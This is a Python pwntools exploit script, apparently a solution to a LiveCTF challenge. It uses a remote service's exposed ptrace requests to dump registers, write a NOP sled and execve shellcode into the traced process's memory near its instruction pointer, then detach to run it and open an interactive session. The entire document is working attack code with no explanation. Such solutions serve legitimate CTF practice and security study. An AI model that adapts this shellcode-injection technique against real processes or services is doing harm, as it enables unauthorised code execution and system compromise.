import argparse
import struct
from mmap import MAP_ANONYMOUS
from pwn import *
from pathlib import Path

# context.log_level = 'debug'

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

def ptrace(req, addr, data):
    r.recvuntil("What ptrace request do you want to send?")
    r.sendline(f"{req:x}")
    r.recvuntil("What address do you want?")
    r.sendline(f"{addr:x}")
    r.recvuntil("What do you want copied into data?")
    r.sendline(f"{data:x}")

    r.recvuntil("ptrace returned 0x")
    result = int(r.recvuntil("\n"), 16)
    r.recvuntil("Do another (0/1)?\n")
    r.sendline("1")

    return result


def get_regs(regs = None):
    all_regs = ['r15', 'r14', 'r13', 'r12', 'rbp', 'rbx', 'r11', 'r10', 'r9', 'r8', 'rax', 'rcx', 'rdx', 'rsi', 'rdi', 'orig_rax', 'rip', 'cs', 'eflags', 'rsp', 'ss', 'fs_base', 'gs_base', 'ds', 'es', 'fs', 'gs']
    result = {}
    for i, reg in enumerate(all_regs):
        offset = i * 8
        if regs is None or reg in regs:
            result[reg] = ptrace(3, offset, 0)
    return result


def dump_regs():
    regs = get_regs()
    for i,(n,v) in enumerate(regs.items()):
        offset = i * 8
        print(f"{n: <8} @ {offset:02x} = {v:016x}")


dump_regs()

# for i in range(0, 216, 8):
#     poke_user_result = ptrace(6, i, 0x4141414141414141)
#     print(f"@{i:02x} => {poke_user_result=:x}")
# dump_regs()

regs = get_regs()

sc = asm(shellcraft.amd64.linux.execve("/home/livectf/submitter", ["/home/livectf/submitter", "1"]), arch='amd64', os='linux')
sc = b"\x90"*100 + sc
for i in range(0, len(sc), 8):
    addr = (regs['rip'] - 20 + i)
    # old_data = ptrace(1, addr, 0)
    section = (sc[i:i+8] + b"\x00\x00\x00\x00\x00\x00\x00\x00")[:8]
    write_result = ptrace(4, addr, u64(section))
    # new_data = ptrace(1, addr, 0)
    print(f"{addr:x} <-- {u64(section):016x}")
    # print(f"{addr:x} <-- {u64(section):016x} (prev: {old_data:016x})")
    # assert new_data == u64(section)
    # print(f"{write_result=:x}")

# for i in range(100):
#     regs = get_regs('rip')
#     data = ptrace(1, regs['rip'], 0)
#     print(f"{regs['rip']=:x} {data=:016x}")
#     ptrace(9, 0, 0)

ptrace(17, 0, 0)

r.interactive()
